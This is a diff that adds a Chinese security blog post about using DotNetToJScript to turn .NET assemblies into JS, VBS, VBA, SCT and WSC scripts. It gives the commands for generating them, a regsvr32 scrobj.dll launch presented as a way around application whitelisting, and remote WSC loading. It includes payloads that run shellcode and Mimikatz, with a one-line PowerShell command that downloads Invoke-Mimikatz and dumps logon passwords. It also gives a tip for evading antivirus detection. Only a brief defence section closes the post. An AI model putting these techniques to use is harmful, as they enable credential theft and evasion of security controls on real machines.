@@ -1,0 +1,289 @@
+I"�%<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>最近James Forshaw开源了一个工具<code class="language-plaintext highlighter-rouge">DotNetToJScript</code>，能够利用JS/Vbs脚本加载.Net程序，很有趣。
+Casey Smith和Cn33liz都对此做了进一步研究，开源了他们的利用代码。
+本文将要对该技术作系统整理，帮助大家更好的认识。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>DotNetToJScript编译方法</li>
+  <li>DotNetToJScript使用方法</li>
+  <li>利用JS/Vbs执行shellcode</li>
+  <li>利用JS/Vbs执行powershell脚本</li>
+</ul>
+
+<h2 id="0x02-dotnettojscript编译方法">0x02 DotNetToJScript编译方法</h2>
+<hr />
+
+<p><strong>DotNetToJScript下载地址：</strong></p>
+
+<p>https://github.com/tyranid/DotNetToJScript</p>
+
+<p>使用工具VS2012进行编译</p>
+
+<h3 id="报错1">报错1：</h3>
+
+<p>缺少程序集引用NDesk.Options</p>
+
+<p><strong>解决方法：</strong></p>
+
+<p>需要添加引用<code class="language-plaintext highlighter-rouge">NDesk.Options</code></p>
+
+<p><strong>下载地址：</strong></p>
+
+<p>http://www.ndesk.org/Options</p>
+
+<p>解压缩，工程-添加引用-浏览-\ndesk-options-0.2.1.bin\ndesk-options-0.2.1.bin\lib\ndesk-options\NDesk.Options.dll</p>
+
+<p>接下来，将目标框架指定为.NET Frameword 2.0，重新编译</p>
+
+<h3 id="报错2">报错2：</h3>
+
+<p>缺少程序集引用Linq</p>
+
+<p><strong>解决方法：</strong></p>
+
+<p>添加对System.Core.dll 3.5的引用</p>
+
+<p>位置:</p>
+
+<p><code class="language-plaintext highlighter-rouge">C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Core.dll</code></p>
+
+<p>添加引用后编译成功，分别在两个目录生成DotNetToJScript.exe和ExampleAssembly.dll</p>
+
+<h2 id="0x03-dotnettojscript使用方法">0x03 DotNetToJScript使用方法</h2>
+<hr />
+
+<h3 id="1生成js脚本">1、生成js脚本</h3>
+
+<p>参数如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -o 1.js ExampleAssembly.dll</code></p>
+
+<p>执行后，生成1.js</p>
+
+<p>执行1.js，调用ExampleAssembly.dll中的public TestClass()</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-30/3-1.png" alt="Alt text" /></p>
+
+<p>执行过程如下图，弹出对话框</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-30/3-2.png" alt="Alt text" /></p>
+
+<h3 id="2生成vbs脚本">2、生成vbs脚本</h3>
+
+<p>参数如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -l vbscript -o 2.vbs ExampleAssembly.dll</code></p>
+
+<p>执行如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-30/3-3.png" alt="Alt text" /></p>
+
+<h3 id="3生成vba脚本">3、生成vba脚本</h3>
+
+<p>参数如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -l vba -o 2.txt ExampleAssembly.dll</code></p>
+
+<p>用来放在office宏中</p>
+
+<h3 id="4生成sct脚本">4、生成sct脚本</h3>
+
+<p>参数如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -u -o 3.sct ExampleAssembly.dll</code></p>
+
+<p>启动方式:</p>
+
+<p>命令行参数如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">regsvr32.exe /u /n /s /i:3.sct scrobj.dll</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>细节可参考之前的文章《Use SCT to Bypass Application Whitelisting Protection》</p>
+
+<h3 id="5生成wsc脚本">5、生成wsc脚本</h3>
+
+<p>参数如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -m -o 4.wsc ExampleAssembly.dll</code></p>
+
+<p><strong>启动方式1：本地调用</strong></p>
+
+<p>通过js调用，js脚本内容如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">GetObject("script:C:\\test\\4.wsc");</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>需要绝对路径，wsc文件后缀名任意</p>
+
+<p><strong>启动方式2：远程启动</strong></p>
+
+<p>将4.wsc保存在github，地址如下：</p>
+
+<p>https://raw.githubusercontent.com/3gstudent/test/master/4.wsc</p>
+
+<p>js脚本内容如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">GetObject("script:https://raw.githubusercontent.com/3gstudent/test/master/4.wsc")</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>细节可参考之前的文章《WSC、JSRAT and WMI Backdoor》</p>
+
+<h2 id="0x04-利用jsvbs能够实现的payload汇总">0x04 利用JS/Vbs能够实现的payload汇总</h2>
+<hr />
+
+<p>对以上测试中的ExampleAssembly.dll，可替换成其他payload：</p>
+
+<h3 id="1执行shellcode">1、执行shellcode</h3>
+
+<p>代码可参考如下地址：</p>
+
+<p>https://gist.github.com/subTee/618d40aa4229581925eb9025429d8420#gistcomment-2057305</p>
+
+<p>新建c#工程，可选择c#控制台应用程序，编译成exe</p>
+
+<p>生成js脚本的参数如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">DotNetToJScript.exe -o shellcode.js shellcode.exe</code></p>
+
+<p>测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-30/3-4.png" alt="Alt text" /></p>
+
+<h3 id="2执行mimikatz">2、执行mimikatz</h3>
+
+<p>代码可参考如下地址：</p>
+
+<p>https://gist.github.com/subTee/b30e0bcc7645c790fcd993cfd0ad622f</p>
+
+<p>在c#中执行mimikatz的代码可参考如下地址：</p>
+
+<p>https://gist.github.com/subTee/5c636b8736530fb20c3d</p>
+
+<h3 id="3执行powershell">3、执行powershell</h3>
+
+<p>代码可参考如下地址：</p>
+
+<p>https://github.com/Cn33liz/StarFighters</p>
+
+<p>作者：Cn33liz</p>
+
+<p><strong>StarFighters：</strong></p>
+
+<ul>
+  <li>能够加载Empire框架的启动代码</li>
+  <li>支持JavaScript和VBScript</li>
+  <li>不需要powershell.exe，可用于绕过白名单拦截</li>
+  <li>通过powershell runspace environment (.NET)执行powershell代码</li>
+</ul>
+
+<p>执行powershell代码的方式可参考工程p0wnedShell，地址如下：</p>
+
+<p>https://github.com/Cn33liz/p0wnedShell</p>
+
+<p>我之前对此做过研究，对其精简代码，使其支持.net 2.0，地址如下：</p>
+
+<p>https://github.com/3gstudent/Smallp0wnedShell</p>
+
+<p><strong>实际测试：</strong></p>
+
+<p>StarFighters不仅能够加载Empire框架的启动代码，也可用来直接执行powershell命令</p>
+
+<p><strong>方式如下：</strong></p>
+
+<p><strong>（1）执行powershell单条命令</strong></p>
+
+<p>需要对命令作base64编码，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$code = 'start calc.exe'
+$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
+$encoded = [System.Convert]::ToBase64String($bytes)
+$encoded 
+</code></pre></div></div>
+
+<p>得到base64代码如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">cwB0AGEAcgB0ACAAYwBhAGwAYwAuAGUAeABlAA==</code></p>
+
+<p>替换StarFighter.js中的var EncodedPayload</p>
+
+<p>成功执行，弹出计算器如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-30/4-1.png" alt="Alt text" /></p>
+
+<p><strong>（2）本地执行powershell脚本</strong></p>
+
+<p>使用Invoke-Mimikatz.ps1，下载地址如下：</p>
+
+<p>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</p>
+
+<p>添加导口令的操作代码：</p>
+
+<p><code class="language-plaintext highlighter-rouge">Invoke-Mimikatz -Command "log privilege::debug sekurlsa::logonpasswords"</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>添加log参数是为了将结果导出到文件mimikatz.log</p>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$code = Get-Content -Path Invoke-Mimikatz.ps1
+$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
+$encoded = [System.Convert]::ToBase64String($bytes)
+$encoded | Out-File 1.txt
+</code></pre></div></div>
+
+<p>将生成的1.txt中的内容替换StarFighter.js中的var EncodedPayload</p>
+
+<p><strong>（3）远程执行powershell脚本</strong></p>
+
+<p>powershell命令如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">powershell IEX "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'log privilege::debug sekurlsa::logonpasswords'"</code></p>
+
+<p>作base64的代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$code = Get-Content -Path code.txt
+$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
+$encoded = [System.Convert]::ToBase64String($bytes)
+$encoded | Out-File 2.txt
+</code></pre></div></div>
+
+<p>将生成的2.txt中的内容替换StarFighter.js中的var EncodedPayload</p>
+
+<p><strong>注：</strong></p>
+
+<p>某杀毒软件默认会查杀该js脚本，一个绕过静态查杀的思路（不保证有效期）：</p>
+
+<ul>
+  <li>将脚本保存成ASCII格式，会被查杀</li>
+  <li>换成UNICODE格式，不被查杀</li>
+</ul>
+
+<h2 id="0x05-防御">0x05 防御</h2>
+<hr />
+
+<p>站在防御的角度，大家都会对powerShell.exe作拦截，但是这还远远不够:</p>
+
+<p><strong>powershell runspace environment (.NET)才是重点</strong></p>
+
+<p>具体到本文的技巧，防御方法如下：</p>
+
+<p>分别对js、vbs、vba宏、sct、wsc脚本作限制</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+:ET
